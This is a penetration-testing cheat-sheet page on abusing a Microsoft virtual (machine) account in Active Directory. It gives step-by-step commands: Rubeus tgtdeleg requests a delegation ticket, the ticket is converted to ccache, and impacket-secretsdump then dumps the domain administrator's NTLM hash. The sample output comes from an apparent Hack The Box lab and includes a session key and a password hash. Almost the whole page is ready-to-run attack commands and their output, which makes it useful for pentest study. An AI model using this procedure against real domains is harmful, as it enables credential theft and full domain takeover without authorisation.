---
title: "Machine Account"
date: 2024-8-1
tags: ["Kerberos", "Credential Dumping", "Pass-The-Ticket", "Rubeus", "Ticket Granting Ticket", "Domain Controller", "Machine Account", "Microsoft Virtual Account", "Active Directory", "Windows"]
---

### Abuse #1: Microsoft virtual account

#### 1. Create a ticket from Microsoft virtual account

{{< tab set1 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
.\rubeus.exe tgtdeleg /nowrap /ptt
```

```console {class="sample-code"}
PS C:\programdata> .\rubeus.exe tgtdeleg /nowrap /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/g0.flight.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: W4jpmQuUqxCWpBh7QpPEkePICUi1mU/91EaqO2SfUgs=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFVDCCBV ---[SNIP]--- lHSFQuSFRC
```

{{< /tabcontent >}}

#### 2. Secrets Dump

{{< tab set2 tab1 >}}Linux{{< /tab >}}
{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Convert kirbi to ccache

```console
python3 rubeustoccache.py '<BASE64_TICKET>' secrets.kirbi secrets.ccache
```

```console {class="sample-code"}
$ python3 rubeustoccache.py 'doIFVDCCBV ---[SNIP]--- lHSFQuSFRC' secrets.kirbi secrets.ccache
╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐
╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ 
╩╚═└─┘└─┘└─┘└─┘└─┘   ┴ └─┘  ╚═╝└─┘┴ ┴└─┘┴ ┴└─┘
              By Solomon Sklash
          github.com/SolomonSklash
   Inspired by Zer1t0's ticket_converter.py

[*] Writing decoded .kirbi file to secrets.kirbi
[*] Writing converted .ccache file to secrets.ccache
[*] All done! Don't forget to set your environment variable: export KRB5CCNAME=secrets.ccache
```

#### 2. Secrets Dump

```console
export KRB5CCNAME=secrets.ccache
```

```console {class="sample-code"}
$ export KRB5CCNAME=secrets.ccache
```

```console
sudo ntpdate -s <DC_IP> && impacket-secretsdump <TARGET> -k -no-pass -just-dc-user administrator
```

```console {class="sample-code"}
$ sudo ntpdate -s g0.flight.htb && impacket-secretsdump g0.flight.htb -k -no-pass -just-dc-user administrator

Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
---[SNIP]---
[*] Cleaning up..
```

<small>*Ref: [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)*</small>

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

#### 1. TO-DO

```console
TO-DO
```

{{< /tabcontent >}}
